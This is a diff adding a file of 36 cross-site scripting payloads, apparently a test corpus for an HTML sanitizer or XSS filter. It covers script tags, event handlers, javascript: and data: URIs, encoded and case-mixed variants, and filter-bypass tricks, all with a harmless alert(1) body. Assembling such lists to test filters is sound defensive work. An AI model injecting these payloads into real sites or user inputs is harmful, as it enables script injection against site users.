@@ -1,0 +1,36 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<a href="javascript:alert(1)">x</a>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><input type=submit></form>
+<button formaction="javascript:alert(1)">x</button>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<base href="javascript:alert(1)">
+<style>body{background:url(javascript:alert(1))}</style>
+<details ontoggle=alert(1) open>
+<marquee onstart=alert(1)>
+<svg><script>alert(1)</script></svg>
+<math><mtext><script>alert(1)</script></mtext></math>
+<iframe><script>alert(1)</script></iframe>
+<form><button formaction="javascript:alert(1)">x</button></form>
+<a href="data:text/html,<script>alert(1)</script>">x</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
+<a href="vbscript:msgbox(1)">x</a>
+<a href="JaVaScRiPt:alert(1)">x</a>
+<a href="java\tscript:alert(1)">x</a>
+<a href="java\nscript:alert(1)">x</a>
+<a href="&#106;avascript:alert(1)">x</a>
+<a href="&#x6A;avascript:alert(1)">x</a>
+<a href="&#0000106;avascript:alert(1)">x</a>
+<svg><set attributeName="onbegin" to="alert(1)"/></svg>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<![if IE]><script>alert(1)</script><![endif]>
+<INPUT TYPE="image" SRC="javascript:alert(1)">
+<a href="  javascript:alert(1)">x</a>
+<a HREF="javascript:alert(1)">x</a>
+<a hRef="javascript:alert(1)">x</a>
